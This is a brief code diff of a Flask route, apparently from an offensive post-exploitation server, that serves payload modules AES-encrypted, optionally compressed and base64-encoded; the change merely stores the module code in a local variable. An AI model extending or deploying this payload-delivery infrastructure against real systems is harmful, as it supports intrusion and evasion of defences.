@@ -251,11 +251,12 @@ def payload_m():
     n = int(request.args.get('m'))
     if n < len(modules):
         modules[n].activate()
+        code = modules[n].code
         if 'c' in request.args:
-            encrypted = encrypt_aes(compress(modules[n].code), ph_app.key)
+            encrypted = encrypt_aes(compress(code), ph_app.key)
             resp = b64encode(encrypted),
         else:
-            resp = b64encode(encrypt_aes(modules[n].code, ph_app.key)),
+            resp = b64encode(encrypt_aes(code, ph_app.key)),
         return Response(
             resp,
             content_type='text/plain; charset=utf-8'
